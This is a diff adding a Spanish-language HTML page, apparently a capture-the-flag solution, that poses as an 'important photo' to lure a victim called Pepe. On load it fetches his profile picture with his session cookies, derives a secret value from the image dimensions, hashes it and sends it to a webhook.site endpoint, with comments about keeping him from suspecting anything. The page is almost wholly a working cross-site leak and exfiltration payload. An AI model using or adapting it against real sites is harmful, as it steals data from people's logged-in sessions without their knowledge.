@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mirá esta foto importante</title>
+  <style>
+    body { font-family: system-ui, sans-serif; background:#0b1220; color:#e6e6e6; text-align:center; padding:40px; }
+    .ok { color:#39d98a; } .wait { color:#f5a623; }
+    code { background:#111a2e; padding:2px 6px; border-radius:4px; }
+  </style>
+</head>
+<body>
+  <!-- Decoy visible para que Pepe no sospeche -->
+  <h2>Cargando tu imagen importante…</h2>
+  <p id="status" class="wait">Un momento…</p>
+  <p id="result"></p>
+
+  <!--
+    CONFIGURACIÓN (editar antes de desplegar):
+    - CHALLENGE_ORIGIN: el dominio del challenge (protocolo + dominio, SIN path).
+    - LEAK_ENDPOINT: tu receptor. Opciones:
+        * https://webhook.site/<tu-id>   (lo más rápido, sin backend)
+        * https://TU-SERVER/leak         (usa receiver.php incluido en este repo)
+  -->
+  <script>
+    const CHALLENGE_ORIGIN = "https://chl-b2994f1b-d435-46b3-ae85-50dd3876500e-imagen-importante.softwareseguro.com.ar";
+    const LEAK_ENDPOINT    = "https://webhook.site/6e0a2c00-e2a2-482a-9287-8dc842de1df7";
+
+    const PROFILE_PIC = CHALLENGE_ORIGIN + "/profile-pic";
+  </script>
+
+  <!-- MD5 (implementación compacta de dominio público) -->
+  <script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.19.0/js/md5.min.js"></script>
+
+  <script>
+    const statusEl = document.getElementById("status");
+    const resultEl = document.getElementById("result");
+
+    // UN SOLO request por carga (cupo de webhook limitado).
+    let sent = false;
+    function exfil(data){
+      if (sent) return;              // nunca más de un envío
+      sent = true;
+      const qs = new URLSearchParams(data).toString();
+      let ok = false;
+      try { ok = navigator.sendBeacon(LEAK_ENDPOINT + "?" + qs); } catch(e){}
+      if (!ok) { try { new Image().src = LEAK_ENDPOINT + "?" + qs; } catch(e){} } // fallback solo si beacon falla
+    }
+
+    const img = new Image();
+    img.crossOrigin = undefined; // NO pedir CORS: la carga simple lleva las cookies de Pepe
+    img.onload = () => {
+      const w = img.naturalWidth, h = img.naturalHeight;
+      const level = w * h;
+      const hash = (typeof md5 === "function") ? md5(String(level)) : "(md5 no disponible, calcular aparte)";
+      const payload = { w, h, level, md5: hash, origin: CHALLENGE_ORIGIN };
+
+      exfil(payload);
+
+      statusEl.className = "ok";
+      statusEl.textContent = "Listo.";
+      // Visible solo para debug propio (Pepe también lo vería; borrá si querés sigilo):
+      resultEl.innerHTML =
+        "intrinsic: <code>" + w + " x " + h + "</code><br>" +
+        "level = <code>" + level + "</code><br>" +
+        "md5 = <code>" + hash + "</code>";
+    };
+    img.onerror = () => {
+      statusEl.className = "wait";
+      statusEl.textContent = "No cargó la imagen (¿sesión/SameSite?).";
+      exfil({ error: "onerror", origin: CHALLENGE_ORIGIN });
+    };
+
+    // Dispara la carga con la sesión del visitante (Pepe)
+    img.src = PROFILE_PIC;
+  </script>
+</body>
+</html>
